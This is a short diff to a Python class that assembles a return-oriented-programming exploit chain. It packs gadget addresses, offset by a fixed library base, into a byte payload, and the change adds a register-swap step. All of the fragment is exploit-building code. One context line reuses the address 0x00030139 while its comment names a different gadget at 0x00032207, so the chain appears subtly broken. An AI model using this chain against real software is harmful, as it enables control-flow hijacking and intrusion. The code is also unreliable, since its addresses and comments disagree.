@@ -155,6 +155,7 @@ class ROP:
         self.xchg_w_eax("edx") #xchg eax, edx - where edx = input symbol 
         self.arr += (0x00030139 + 0xb7dec000).to_bytes(4, byteorder='little') #0x00030139 : mov eax, ecx ; ret - where eax = count
         self.arr += (0x00030139 + 0xb7dec000).to_bytes(4, byteorder='little') #0x00032207 : sub eax, edx ; ret - where eax = count - symbol
+        self.swp_regs("edx", "esi")
 
         #self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')   #sub eax, ecx ; ret
         #self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')   # neg eax ; ret
